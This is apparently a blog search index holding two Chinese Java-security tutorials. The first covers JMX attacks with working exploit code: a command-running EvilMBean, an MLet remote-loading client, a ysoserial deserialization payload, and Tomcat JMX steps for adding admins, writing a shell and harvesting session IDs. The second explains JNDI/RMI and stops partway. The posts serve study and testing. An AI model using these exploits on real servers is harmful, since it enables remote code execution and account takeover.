<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>JMX攻击</title>
    <url>/2023/06/01/JMX/</url>
    <content><![CDATA[<h1 id="JMX介绍"><a href="#JMX介绍" class="headerlink" title="JMX介绍"></a>JMX介绍</h1><p>JMX 全称为 Java Management Extensions，翻译过来就是 Java 管理扩展，用来管理和监测 Java 程序。最常用到的就是对于 JVM 的监测和管理，比如 JVM 内存、CPU 使用率、线程数、垃圾收集情况等等。</p>
<p>用 Spring Boot 去理解，Spring Boot Actuator 它就用到了 JMX （Spring Boot &gt; 2.2.x 默认禁用 JMX Tomcat Bean 暴露）。JConsole 或者 VisualVM 它们也用到了 JMX。</p>
<p><img src="/images/20230601171558.png"></p>
<h2 id="MBean"><a href="#MBean" class="headerlink" title="MBean"></a>MBean</h2><p>JMX 是通过各种 MBean(Managed Bean) 传递消息的，MBean 其实就是我们经常说的 Java Bean，只不过由于它比较特殊，所以称之为 MBean。既然是个 Bean，里面就是一些属性和方法，外界就可以获取被管理的资源的状态和操纵MBean的行为。JMX 中共有四种类型的 MBean，分别是 Standard MBean, Dynamic MBean, Open MBean, Model MBean。JDK 提供的 MBean 主要在 java.lang.management 和 javax.management包里面。</p>
<h2 id="MBeanServer"><a href="#MBeanServer" class="headerlink" title="MBeanServer"></a>MBeanServer</h2><p>MBeanServer 是负责管理 MBean 的，一般一个 JVM 只有一个 MBeanServer，所有的 MBean 都要注册到 MBeanServer 上，并通过 MBeanServer 对外提供服务。一般用 ManagementFactory.getPlatformMBeanServer()方法获取当前 JVM 内的 MBeanServer。</p>
<h2 id="适配器和连接器"><a href="#适配器和连接器" class="headerlink" title="适配器和连接器"></a>适配器和连接器</h2><p>写好的 MBean 注册到 MBeanServer 上之后，功能已经具备了。<strong>适配器和连接器就是将这些功能开放出来的方式</strong> 。 比如 HTTP协议适配器，就是将功能以 HTTP 协议开放出去，这样我们就可以在浏览器使用了。</p>
<p><strong>连接器是各种客户端最常用的，JDK 提供的默认连接器是 RMI 连接器，JConsole、VisualVM 都是使用它。</strong></p>
<h1 id="基于RMI的JMX演示"><a href="#基于RMI的JMX演示" class="headerlink" title="基于RMI的JMX演示"></a>基于RMI的JMX演示</h1><pre><code>public class JMXDemo &#123;
    public static void main(String[] args) throws Exception &#123;
        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
        ObjectName objectName = new ObjectName(&quot;test:type=HelloWorld&quot;);
        Hello mbean = new Hello();
        mBeanServer.registerMBean(mbean, objectName);

        Registry registry = LocateRegistry.createRegistry(1199);
        
        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
        jmxConnectorServer.start();
        System.out.println(&quot;Server start...&quot;);
    &#125;
&#125;
</code></pre>
<p>拆解：</p>
<ul>
<li>Probe Level</li>
</ul>
<p>实例化HelloMBean类为mbean</p>
<blockquote>
<p>standard MBean：它能管理的资源（包括属性，方法，时间）必须定义在接口中，实例化的MBean必须实现这个接口。它的命名也必须遵循一定的规范，例如我们的MBean为Hello，则接口必须为HelloMBean。<br>dynamic MBean：必须实现javax.management.DynamicMBean接口，所有的属性，方法都在运行时定义。</p>
</blockquote>
<p>代码：</p>
<pre><code>ObjectName objectName = new ObjectName(&quot;test:type=Hello&quot;);
Hello mbean = new Hello();
</code></pre>
<ul>
<li>Agent Level</li>
</ul>
<p>创建了 MBeanServer 实例。<br>主要提供对资源的注册和管理。注册了mbean（具有唯一ObjectName）。</p>
<pre><code>MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
mBeanServer.registerMBean(mbean, objectName);
</code></pre>
<ul>
<li>Remote Management Level</li>
</ul>
<p>创建了JMXServiceURL，绑定到本地1199端口的RMI服务（基于RMI服务的），关联到MBeanServer。</p>
<pre><code>Registry registry = LocateRegistry.createRegistry(1199);
JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
jmxConnectorServer.start();
</code></pre>
<h2 id="使用jconsole图形工具监视、管理JMX"><a href="#使用jconsole图形工具监视、管理JMX" class="headerlink" title="使用jconsole图形工具监视、管理JMX"></a>使用jconsole图形工具监视、管理JMX</h2><p><code>jconsole</code>是基于JMX的可视化监视、管理工具，该工具是JDK的一部分<br>本地可以通过进程方式进行连接，远程可以通过<code>ip:port</code>方式进行连接。</p>
<p>我们连接刚刚创建的rmi服务。</p>
<p><img src="/images/20230601222529.png"></p>
<p>可以用来获取&#x2F;设置bean属性，或调用方法。</p>
<h1 id="攻击一：使用Melt加载远程MBean"><a href="#攻击一：使用Melt加载远程MBean" class="headerlink" title="攻击一：使用Melt加载远程MBean"></a>攻击一：使用Melt加载远程MBean</h1><h2 id="介绍MLet"><a href="#介绍MLet" class="headerlink" title="介绍MLet"></a>介绍MLet</h2><p>Mlet是一个类：<code>javax.management.loading.MLet</code>，这是一个mbean（实现接口<code>MLetMBean</code>）。该mbean存在一个方法<code>getMBeansFromURL</code>，可以从远程<code>mlet server</code>加载mbean。</p>
<p><img src="/images/20230601224936.png"></p>
<p>所以利用Melt攻击流程总结如下：</p>
<ol>
<li>MBeanServer中存在MLet的MBean</li>
<li>利用MLet方法去加载我们恶意server中的Mlet文件</li>
<li>Mlet文件中写入我们恶意jar包服务，被加载</li>
<li>jar包中的恶意Mbean被加载进MBeanServer</li>
<li>通过JMX调用恶意MBean的方法</li>
</ol>
<h2 id="攻击示例与分析"><a href="#攻击示例与分析" class="headerlink" title="攻击示例与分析"></a>攻击示例与分析</h2><p>创建恶意jar文件，用于命令执行</p>
<p>EvilMBean.java:</p>
<pre><code>public interface EvilMBean &#123;
    String runCommand(String cmd);
&#125;
</code></pre>
<p>Evil.java:</p>
<pre><code>public class Evil implements EvilMBean&#123;
    @Override
    public String runCommand(String cmd) &#123;
        try &#123;
            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec(cmd);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            String stdout_err_data = &quot;&quot;;
            String s;
            while ((s = stdInput.readLine()) != null)
            &#123;
                stdout_err_data += s+&quot;\n&quot;;
            &#125;
            while ((s = stdError.readLine()) != null)
            &#123;
                stdout_err_data += s+&quot;\n&quot;;
            &#125;
            proc.waitFor();
            return stdout_err_data;
        &#125;
        catch (Exception e)
        &#123;
            return e.toString();
        &#125;
    &#125;
&#125;
</code></pre>
<p>创建MLet文件，用于指向我们恶意jar包服务</p>
<p><code>mlet.txt</code>:</p>
<pre><code>&lt;html&gt;&lt;mlet code=&quot;Evil&quot; archive=&quot;Evil.jar&quot; name=&quot;MLetCompromise:name=evil,id=1&quot; codebase=&quot;http://127.0.0.1:8000&quot;&gt;&lt;/mlet&gt;&lt;/html&gt;
</code></pre>
<p><code>Evil&quot;</code>为恶意mbean的路径；</p>
<p><code>archive=&quot;Evil.jar&quot;</code>为恶意mbean的jar包；</p>
<p><code>name=&quot;MLetCompromise:name=evil,id=1&quot;</code>可自定义，遵循OBjectname规则；</p>
<p><code>codebase=&quot;http://127.0.0.1:8000&quot;</code>访问为jar包的url。</p>
<p>将Evil.jar和mlet.txt放在同一目录，<code>python3 -m http.server 8000</code>启动web服务。</p>
<p>受害者MBeanServer：</p>
<pre><code>public class MeltJMXDemo &#123;
    public static void main(String[] args) throws Exception &#123;
        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
        MLet mLet = new MLet();
        ObjectName objectNameMLet = new ObjectName(&quot;JMXMLet:type=MLet&quot;);
        mBeanServer.registerMBean(mLet, objectNameMLet);

        Registry registry = LocateRegistry.createRegistry(1199);

        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
        jmxConnectorServer.start();
        System.out.println(&quot;MeltJMXServer start...&quot;);
    &#125;
&#125;
</code></pre>
<p>通过jconsole攻击：</p>
<p>本地起一个server，目录下包含我们的恶意melt文件和jar包</p>
<p><img src="/images/20230601232259.png"></p>
<p>通过jconsole调用Melt的<code>getMBeansFromURL</code>方法，参数中填入我们的恶意server地址</p>
<p><img src="/images/20230601232833.png"></p>
<p>我们的恶意MBean被成功加载，通过恶意MBean命令执行</p>
<p><img src="/images/20230601232958.png"></p>
<h1 id="攻击二：远程加载MBean"><a href="#攻击二：远程加载MBean" class="headerlink" title="攻击二：远程加载MBean"></a>攻击二：远程加载MBean</h1><p>JMX Server可以在本地绑定MBean，同时也可以加载远程MBean，并且这一过程我们可以在客户端控制。</p>
<h2 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h2><p>随便起一个JMXServer，里面随便绑定了个MBean，并没有绑定MLet</p>
<pre><code>public class JMXDemo &#123;
    public static void main(String[] args) throws Exception &#123;
        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
        ObjectName objectName = new ObjectName(&quot;test:type=Hello&quot;);
        Hello mbean = new Hello();
        mBeanServer.registerMBean(mbean, objectName);

        Registry registry = LocateRegistry.createRegistry(1199);

        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
        jmxConnectorServer.start();
        System.out.println(&quot;Server start...&quot;);
    &#125;
&#125;
</code></pre>
<p>通过远程加载MLet，再去加载我们的恶意server中的MBean</p>
<pre><code>public class ExploitJMXByRemoteMBean &#123;
    public static void main(String[] args) throws MalformedURLException &#123;
        connectAndOwn(&quot;127.0.0.1&quot;, &quot;1199&quot;, &quot;ipconfig&quot;);
    &#125;

    static void connectAndOwn(String serverName, String port, String command) throws MalformedURLException &#123;
        try &#123;
            // step1. 通过rmi创建 jmx连接
            JMXServiceURL u = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://&quot; + serverName + &quot;:&quot; + port + &quot;/jmxrmi&quot;);
            System.out.println(&quot;URL: &quot; + u + &quot;, connecting&quot;);
            JMXConnector c = JMXConnectorFactory.connect(u);
            System.out.println(&quot;Connected: &quot; + c.getConnectionId());
            MBeanServerConnection m = c.getMBeanServerConnection();
            // step2. 加载特殊MBean：javax.management.loading.MLet
            ObjectInstance evil_bean = null;
            ObjectInstance evil = null;
            try &#123;
                evil = m.createMBean(&quot;javax.management.loading.MLet&quot;, null);
            &#125; catch (javax.management.InstanceAlreadyExistsException e) &#123;
                evil = m.getObjectInstance(new ObjectName(&quot;DefaultDomain:type=MLet&quot;));
            &#125;
            // step3：通过MLet加载远程恶意MBean
            System.out.println(&quot;Loaded &quot;+evil.getClassName());
            Object res = m.invoke(evil.getObjectName(), &quot;getMBeansFromURL&quot;, new Object[]
                            &#123; &quot;http://127.0.0.1:8000/mlet.txt&quot; &#125;,
                    new String[] &#123; String.class.getName() &#125; );
            HashSet res_set = ((HashSet)res);
            Iterator itr = res_set.iterator();
            Object nextObject = itr.next();
            // 如果恶意mbean已经存在，则直接获取
            if (nextObject instanceof InstanceAlreadyExistsException)
            &#123;
                //
                evil_bean = m.getObjectInstance(new ObjectName(&quot;MLetCompromise:name=evil,id=1&quot;));
            &#125; else if (nextObject instanceof Exception) &#123;
                throw ((Exception)nextObject);
            &#125; else &#123;
                evil_bean = ((ObjectInstance)nextObject);
            &#125;
            // step4: 执行恶意MBean
            System.out.println(&quot;Loaded class: &quot;+evil_bean.getClassName()+&quot; object &quot;+evil_bean.getObjectName());
            System.out.println(&quot;Calling runCommand with: &quot;+command);
            Object result = m.invoke(evil_bean.getObjectName(), &quot;runCommand&quot;, new Object[]&#123; command &#125;, new String[]&#123; String.class.getName() &#125;);
            System.out.println(&quot;Result: &quot;+result);
        &#125; catch (Exception e)
        &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
</code></pre>
<p>恶意MBean被加载，成功命令执行</p>
<p><img src="/images/20230601233920.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该攻击需要两个条件：</p>
<ol>
<li>未启用JMX身份验证</li>
<li>可以调用 <code>getMBeansFromURL</code></li>
</ol>
<p>需要设置<code>jmx.remote.x.mlet.allow.getMBeansFromURL=true</code></p>
<pre><code>MBeanServerAccessController：

final String propName =&quot;jmx.remote.x.mlet.allow.getMBeansFromURL&quot;;
GetPropertyAction propAction = new GetPropertyAction(propName);
String propValue = AccessController.doPrivileged(propAction);
boolean allowGetMBeansFromURL =&quot;true&quot;.equalsIgnoreCase(propValue);
if (!allowGetMBeansFromURL) &#123;
    throw new SecurityException(&quot;Access denied! MLet method &quot; +
            &quot;getMBeansFromURLcannot be invoked unless a &quot; +
            &quot;security manageris installed or the system property &quot; +
            &quot;-Djmx.remote.x.mlet.allow.getMBeansFromURL=true&quot; +
            &quot;isspecified.&quot;);
&#125;
</code></pre>
<h1 id="攻击三：通过MBean方法参数反序列化攻击JMX"><a href="#攻击三：通过MBean方法参数反序列化攻击JMX" class="headerlink" title="攻击三：通过MBean方法参数反序列化攻击JMX"></a>攻击三：通过MBean方法参数反序列化攻击JMX</h1><h2 id="JMX调用MBean的流程"><a href="#JMX调用MBean的流程" class="headerlink" title="JMX调用MBean的流程"></a>JMX调用MBean的流程</h2><ol>
<li>将<code>MBean name</code>、<code>MBean Function Name</code>、<code>params</code>发送给远程<code>rmi server</code>，其中<code>params</code>的处理需要注意下，先转为<code>MarshalledObject</code>，再<code>writeObject</code>为<code>String</code>对象，然后进入网络传输；</li>
<li><code>RMI Server</code>监听到网络请求包含<code>MBean name</code>、<code>MBean Function Name</code>、<code>params</code>，其中params经过<code>MarshalledObject.readObject()</code>反序列化，再通过<code>invoke</code>调用原函数。</li>
</ol>
<h2 id="攻击示例-1"><a href="#攻击示例-1" class="headerlink" title="攻击示例"></a>攻击示例</h2><p>使用<code>CommonsCollections2</code>链，参考<code>ysoserial.exploit.JMXInvokeMBean</code></p>
<pre><code>public class AttackMBeanParams &#123;

    public static void main(String[] args) throws Exception &#123;

        JMXServiceURL url = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);

        JMXConnector jmxConnector = JMXConnectorFactory.connect(url);
        MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();

        // create the payload
        Object payloadObject = ObjectPayload.Utils.makePayloadObject(&quot;CommonsCollections2&quot;, &quot;calc&quot;);
        ObjectName mbeanName = new ObjectName(&quot;java.util.logging:type=Logging&quot;);

        mbeanServerConnection.invoke(mbeanName, &quot;getLoggerLevel&quot;, new Object[]&#123;payloadObject&#125;, new String[]&#123;String.class.getCanonicalName()&#125;);

        //close the connection
        jmxConnector.close();
    &#125;
&#125;
</code></pre>
<p><img src="/images/20230602000002.png"></p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>ysoserial用的<code>java.util.logging:type=Logging</code>，换其他ObjectName也行</p>
<p><img src="/images/20230602000218.png"></p>
<h1 id="攻击四：利用中间件等的特殊MBean攻击JMX"><a href="#攻击四：利用中间件等的特殊MBean攻击JMX" class="headerlink" title="攻击四：利用中间件等的特殊MBean攻击JMX"></a>攻击四：利用中间件等的特殊MBean攻击JMX</h1><h2 id="通过JMX攻击Tomcat"><a href="#通过JMX攻击Tomcat" class="headerlink" title="通过JMX攻击Tomcat"></a>通过JMX攻击Tomcat</h2><p>Tomcat中默认不开启JMX服务，需要在catalina.bat中配置启动参数</p>
<pre><code>set &quot;CATALINA_OPTS=%CATALINA_OPTS% -Dcom.sun.management.jmxremote -DJava.rmi.server.hostname=0.0.0.0 -Dcom.sun.management.jmxremote.port=9999 -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false&quot;
rem   CATALINA_OPTS   (Optional) Java runtime options used when the &quot;start&quot;,
rem                   &quot;run&quot; or &quot;debug&quot; command is executed.
rem                   Include here and not in JAVA_OPTS all options, that should
rem                   only be used by Tomcat itself, not by the stop process,
rem                   the version command etc.
</code></pre>
<p>在9999端口启动一个无认证的JMX服务。</p>
<p>使用jconsole连接到本地tomcat启动的JMX服务。</p>
<h3 id="获取已有用户的密码"><a href="#获取已有用户的密码" class="headerlink" title="获取已有用户的密码"></a>获取已有用户的密码</h3><p><code>User</code>-&gt;<code>&quot;tomcatAdmin&quot;</code>-&gt;<code>UserDatabase</code></p>
<h3 id="添加管理员角色用户"><a href="#添加管理员角色用户" class="headerlink" title="添加管理员角色用户"></a>添加管理员角色用户</h3><ol>
<li><p><code>Users</code>-&gt;<code>UserDatabase</code>，<code>createUser</code>：</p>
</li>
<li><p><code>Users</code>-&gt;<code>UserDatabase</code>，创建角色</p>
</li>
<li><p><code>Users</code>-&gt;<code>User</code>-&gt;<code>[用户名]</code>节点下，将创建的用户与创建的角色关联</p>
</li>
<li><p>保存配置</p>
</li>
</ol>
<h3 id="日志循环函数导致写shell"><a href="#日志循环函数导致写shell" class="headerlink" title="日志循环函数导致写shell"></a>日志循环函数导致写shell</h3><p>Catalina-&gt;Valve-&gt;localhost-&gt;AccessLogValve-&gt;Operations</p>
<p>boolean rotate(string newFileName)</p>
<h3 id="抓取网络应用的用户的session-ID"><a href="#抓取网络应用的用户的session-ID" class="headerlink" title="抓取网络应用的用户的session ID"></a>抓取网络应用的用户的session ID</h3><p>Catalina-&gt;Manager-&gt;[ApplicationName]-&gt;Operations-&gt;listSessionIds()</p>
<h1 id="攻击五：RMI攻击"><a href="#攻击五：RMI攻击" class="headerlink" title="攻击五：RMI攻击"></a>攻击五：RMI攻击</h1><p>因为JMXServer是绑定RMi服务的，所以攻击RMI服务的方式都可以用来攻击JMXServer，这里不再赘述，可以去看RMI攻击的文章</p>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
        <tag>JMX</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDI注入原理分析</title>
    <url>/2023/04/15/JNDI-Injection/</url>
    <content><![CDATA[<h1 id="JNDI简介"><a href="#JNDI简介" class="headerlink" title="JNDI简介"></a>JNDI简介</h1><p>官方：JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。</p>
<p>我们需要知道的是：JNDI封装了对各种访问目录服务的逻辑，我们可以使用JNDI访问现有的目录服务和目录服务（JDBC，LDAP，RMI，NID，CORBA），以前访问这些服务时，针对不同的服务需要写不同的代码，有JNDI后代码实现基本一致。<br><img src="/images/20230421201311.png"><br>一些名词解释：<br>1）Naming Service 命名服务 命名服务将名称和对象进行关联，提供通过名称找到对象的操作。 例如：DNS系统将计算机名和IP地址进行关联。文件系统将文件名和文件句柄进行关联等等。</p>
<p>2）Name 名称 要在命名系统中查找对象，需要提供对象的名称。对象的名称是用来标识该对象的易于人理解的名称。 例如：文件系统用文件名来标识文件对象。DNS系统用机器名来表示IP地址。</p>
<p>3）Binding 绑定 一个名称和一个对象的关联称为一个绑定。 例如：文件系统中，文件名绑定到文件。DNS系统中，机器名绑定到IP地址。</p>
<p>4）Reference 引用 在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。</p>
<p>5）Context 上下文 一个上下文是一系列名称和对象的绑定的集合。一个上下文通常提供一个lookup操作来返回对象，也可能提供绑定，解除绑定，列举绑定名等操作。</p>
<table>
<thead>
<tr>
<th>协议</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>LDAP</td>
<td>轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</td>
</tr>
<tr>
<td>RMI JAVA</td>
<td>远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</td>
</tr>
<tr>
<td>DNS</td>
<td>域名服务</td>
</tr>
<tr>
<td>CORBA</td>
<td>公共对象请求代理体系结构</td>
</tr>
</tbody></table>
<p>#JNDI调用过程<br>（RMI为例）RMI的主要由三部分组成：</p>
<ol>
<li>RMI Registry 注册表：服务实例将被注册表注册到特定的名称中（registry.bind(String name, Remote obj)将对象绑定到rmi注册表）</li>
<li>RMI Server 服务端</li>
<li>RMI Client 客户端：客户端通过查询注册表来获取对应名称的对象引用，以及该对象实现的接口(lookup)</li>
</ol>
<p>RMI Client（JNDI程序）会去用封装好的访问方法（lookup）远程连接RMI Registry寻找对象，RMI Registry把引用返回，RMI Client接受到后先在本地找，找不到的话去与RMI Server进行tcp连接<br>所以服务端有两个端口：1）RMI Server端口，是被随机分配的2）RMI Registry端口，是我们可以指定的<br><img src="/images/20230421205320.png"><br>#JNDI两个方法<br> bind(String name, Object obj) 将name与obj进行绑定<br> lookup(String name) 通过name查找对象（可以远程）<br>当lookup可控时，漏洞出现</p>
<h2 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h2><h3 id="RMI详解"><a href="#RMI详解" class="headerlink" title="RMI详解"></a>RMI详解</h3><p>RMI (Remote Method Invocation) 远程方法调用，是一种调用远程位置的对象来执行方法的思想。为了屏蔽网络通信的复杂性，RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用远端（Server）的目标类之前，也会经过一个对应的远端代理类，就是 Skeleton，它从 Stub 中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeletons 的调用对于 RMI 服务的使用者来讲是隐藏的，我们无需主动的去调用相关的方法。但实际的客户端和服务端的网络通信时通过 Stub 和 Skeleton 来实现的。<br><img src="/images/20230421212615.png"></p>
<h2 id="过程拆解"><a href="#过程拆解" class="headerlink" title="过程拆解"></a>过程拆解</h2><ol>
<li><p>创建远程对象。RemoteInterface remote &#x3D; new RemoteInterfaceImpl();</p>
</li>
<li><p>注册远程对象。registry.bind(“remote”, remote);</p>
</li>
<li><p>客户端访问服务器并查找远程对象。包括两个步骤：</p>
<p> ①用interface定义要查找的远程对象，在第四步作为引用：RemoteInterface remote &#x3D; (RemoteInterface);</p>
<p> ②查找远程对象。Naming.lookup(“rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;service”)</p>
</li>
<li><p>Registry返回服务器对象存根。也就是把远程对象service作为自己的service（引用），称为stub</p>
</li>
<li><p>调用远程方法。remote.sayHello(“ok”)</p>
</li>
<li><p>客户端存根和服务器骨架通信</p>
</li>
<li><p>骨架代理调用remote.sayHello(“ok”);，实际上是在Server端调用的</p>
</li>
<li><p>骨架把结果返回给存根</p>
</li>
<li><p>存根把结果返回给客户端</p>
</li>
</ol>
<p>代码实现：</p>
<p>定义一个能够远程调用的接口，继承 java.rmi.Remote 接口，这个接口中的所有方法都必须声明抛出 java.rmi.<br>RemoteException 异常</p>
<pre><code>import java.rmi.Remote;
import java.rmi.RemoteException;

public interface RemoteInterface extends Remote &#123;
    public String sayHello(String name) throws RemoteException;
&#125;
</code></pre>
<p>创建这个远程接口的实现类，这个类中是真正的执行逻辑代码，并且继承 java.rmi.server.UnicastRemoteObject 类,童谣所有方法抛出RemoteException</p>
<blockquote>
<p>在RMI中 UnicastRemoteObject类是与Object超类等效的,该类提供了equals( ) , hashcode( ), toString( )方法,继承UnicastRemoteObject类的子类在 export 时，会随机绑定一个端口，开始监听来自客户端（Stubs）的请求，即使不注册，直接请求这个端口也可以通信。如果不想让远程对象成为 UnicastRemoteObject 的子类，后面就需要主动的使用其静态方法 exportObject 来手动 export 对象。</p>
</blockquote>
<pre><code>import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteInterfaceImpl extends UnicastRemoteObject implements RemoteInterface &#123;
    protected RemoteInterfaceImpl() throws RemoteException &#123;
        super();
    &#125;

    @Override
    public String sayHello(String name) throws RemoteException &#123;
        return &quot;Hello &quot; + name;
    &#125;
&#125;
</code></pre>
<h3 id="RMI-registry"><a href="#RMI-registry" class="headerlink" title="RMI registry"></a>RMI registry</h3><p>Java RMI 设计了一个 注册表 （RMI registry） 的思想，当想要调用某个远程对象的方法时，通过该远程对象在注册时提供在注册表（registry）中的别名（Name），来让注册表（registry）返回该远程对象的引用，后续通过该引用实现远程方法调用。由 java.rmi.registry.Registry 和 java.rmi.Naming 来实现。</p>
<p>Naming 提供了查询（lookup）、绑定（bind）、重新绑定（rebind）、接触绑定（unbind）、list（列表）用来对注册表进行操作。这个类提供的每个方法都有一个 URL 格式的参数，格式如下： <strong>&#x2F;&#x2F;host:port&#x2F;name</strong>：</p>
<ul>
<li>host 表示注册表所在的主机</li>
<li>port 表示注册表接受调用的端口号，默认为 1099</li>
<li>name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键字</li>
</ul>
<p>从下面的java.rmi.Naming#lookup源码可以看出，这些方法调用 <strong>LocateRegistry.getRegistry</strong> 方法获取了 Registry 接口的实现类，并调用其相关方法进行实现的</p>
<pre><code>public static Remote lookup(String name)
    throws NotBoundException,
        java.net.MalformedURLException,
        RemoteException
&#123;
    ParsedNamingURL parsed = parseURL(name);
    Registry registry = getRegistry(parsed);

    if (parsed.name == null)
        return registry;
    return registry.lookup(parsed.name);
&#125;
</code></pre>
<p>使用 LocateRegistry#createRegistry() 方法来创建注册中心,将待调用的类进行绑定:</p>
<pre><code>import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.Naming;

public class RMIService &#123;
    public static void main(String[] args) throws Exception&#123;

        // 创建一个rmi映射表
        Registry registry = LocateRegistry.createRegistry(1099);
        // 创建一个对象
        RemoteInterface remote = new RemoteInterfaceImpl();
        // 将对象绑定到rmi注册表
        registry.bind(&quot;remote&quot;, remote);

    &#125;
&#125;
</code></pre>
<p>Client端进行调用，</p>
<pre><code>import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.HashMap;
import java.util.Properties;

public class RMIClient &#123;
    public static void main(String[] args) throws Exception&#123;

        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
        env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);

        // 创建初始化环境
        Context ctx = new InitialContext(env);
        //  jndi的方式获取远程对象
        RemoteInterface remote = (RemoteInterface) ctx.lookup(&quot;rmi://localhost:1099/remote&quot;);
        // 调用远程对象的方法
        System.out.println(remote.sayHello(&quot;ok&quot;));
    &#125;

&#125;
</code></pre>
<p>先运行RMIService，之后启动RMIClient端，成功调用了远程对象的方法。<br><img src="/images/20230421225546.png"></p>
<blockquote>
<p>更多扩展请查看<a href="Java_RMI.md">Java_RMI</a></p>
</blockquote>
<h3 id="攻击JNDI"><a href="#攻击JNDI" class="headerlink" title="攻击JNDI"></a>攻击JNDI</h3><p>JNDI实际就是对RMI的方法进行了封装，JNDI的本质就是RMI服务端攻击RMI客户端。不同的是，JDNI运行获取一个特性的对象：远程引用对象————Reference。</p>
<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
<p>JNDI客户端可以加载远程的RMI服务的class文件来进行实例化。通过lookup指定一个远程服务，远程服务是通过Reference来远程加载类文件。这样就可以对JNDI客户端进行攻击。加载远程类的时候static静态代码块,代码块,无参构造函数和getObjectInstance方法都会被调用。</p>
<p>在使用Reference时，我们可以直接将对象传入构造方法中，当被调用时，对象的方法就会被触发，创建Reference实例时几个比较关键的属性：</p>
<p>className：远程加载时所使用的类名；</p>
<p>classFactory：加载的class中需要实例化类的名称；</p>
<p>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file&#x2F;ftp&#x2F;http等协议；</p>
<p>当然，要把一个对象绑定到rmi注册表中，这个对象需要继承UnicastRemoteObject，但是Reference没有继承它，所以我们还需要封装一下它，</p>
<ol>
<li>用 ReferenceWrapper 包裹一下Reference实例对象，这样就可以将其绑定到rmi注册表，并被远程访问到了。</li>
<li>通过JDNI的bind方法去绑定Reference对象，底层会帮我们自动封装成ReferenceWrapper</li>
</ol>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>RMIServer，我们的恶意服务端，remote绑定着我们的应用对象ReferenceWrapper或者使用JNDI的方法去绑定，这里我选择了后者</p>
<pre><code>public class RMIServer &#123;
    public static void main(String[] args) throws Exception &#123;
        // 创建一个对象
        RemoteInterface remote = new RemoteInterfaceImpl();
        // 创建一个rmi映射表
        Registry registry = LocateRegistry.createRegistry(1099);
        // 将对象绑定到rmi注册表
        registry.bind(&quot;remote&quot;, remote);

    &#125;
&#125;
</code></pre>
